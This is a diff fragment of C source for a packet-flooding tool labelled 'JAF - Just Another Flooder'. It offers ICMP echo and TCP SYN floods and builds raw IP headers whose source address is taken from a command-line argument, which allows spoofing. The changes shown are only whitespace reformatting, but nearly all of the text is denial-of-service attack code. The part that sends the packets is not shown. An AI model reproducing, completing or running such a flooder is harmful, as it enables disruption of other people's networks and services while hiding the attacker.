@@ -85,17 +85,17 @@ int main(int argc, char **argv) {
 	memset(buf, 0, PKT_LEN);
 	
 	ip->ihl = 5; 
-    ip->version = 4;
-    ip->tos = 16;
-    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    ip->id = htons(50000);
-    ip->frag_off = 0;
-    ip->ttl = 64;
-    ip->check = 0;
-    ip->saddr = inet_addr(argv[3]);
-    ip->daddr = inet_addr(argv[1]);
+	ip->version = 4;
+	ip->tos = 16;
+	ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+	ip->id = htons(50000);
+	ip->frag_off = 0;
+	ip->ttl = 64;
+	ip->check = 0;
+	ip->saddr = inet_addr(argv[3]);
+	ip->daddr = inet_addr(argv[1]);
     
-    printf(".:[JAF - Just Another Flooder]:."
+	printf(".:[JAF - Just Another Flooder]:."
 		   "[0] - ICMP ECHO Flood\n"
 		   "[1] - TCP SYN Flood\n\n");
 	
@@ -106,10 +106,10 @@ int main(int argc, char **argv) {
 		ip->protocol = IPPROTO_ICMP;
 		printf("[+] Building the ICMP Packet\n");
 		icmp->type = 8;
-        icmp->code = 0;
-        icmp->checksum = 0;
-        icmp->id = 1;
-        icmp->sequence = 1;
+		icmp->code = 0;
+		icmp->checksum = 0;
+		icmp->id = 1;
+		icmp->sequence = 1;
 	}
 
 	else if (choose == 1) {	
